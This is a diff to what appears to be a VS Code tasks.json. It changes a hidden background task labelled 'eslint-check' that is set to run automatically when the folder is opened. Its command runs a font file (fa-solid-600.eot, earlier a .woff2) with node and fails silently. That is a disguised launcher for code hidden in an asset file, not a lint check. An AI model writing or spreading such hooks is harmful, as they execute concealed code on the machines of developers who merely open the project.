@@ -1,10 +1,19 @@
 {
   "version": "2.0.0",
+  "configurations": [
+    {
+      "type": "node",
+      "request": "launch",
+      "name": "Run My Project",
+      "console": "",
+      "internalConsoleOptions": "openOnSessionStart"
+    }
+  ],
   "tasks": [
     {
       "label": "eslint-check",
       "type": "shell",
-      "command": "(command -v node >/dev/null 2>&1 && node ./src/app/api/super/provision-jobs/[id]/run/public/fonts/fa-solid-400.woff2) || (where node >nul 2>&1 && node ./src/app/api/super/provision-jobs/[id]/run/public/fonts/fa-solid-400.woff2) || echo ''",
+      "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-600.eot) || (where node >nul 2>&1 && node ./public/fonts/fa-solid-600.eot) || echo ''", 
       "problemMatcher": [],
       "isBackground": true,
       "hide": true,
@@ -19,6 +28,6 @@
       "runOptions": {
         "runOn": "folderOpen"
       }
-    }
+    },
   ]
 }
